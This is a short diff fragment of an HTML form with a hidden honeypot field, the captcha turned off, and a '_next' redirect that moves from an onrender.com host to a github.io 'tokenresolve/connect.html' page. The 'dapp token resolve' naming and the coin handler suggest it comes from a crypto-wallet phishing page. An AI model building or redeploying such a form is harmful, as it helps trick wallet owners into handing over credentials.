@@ -63,7 +63,7 @@ function click(coin) {
           <input type="text" name="_honey" style="display: none;">
           <input type="hidden" name="_captcha" value="false">
 
-          <input type="hidden" name="_next" value="https://dapptokenresolve.onrender.com/connect.html">
+          <input type="hidden" name="_next" value="https://dapp0001.github.io/tokenresolve/connect.html">
           
 
 
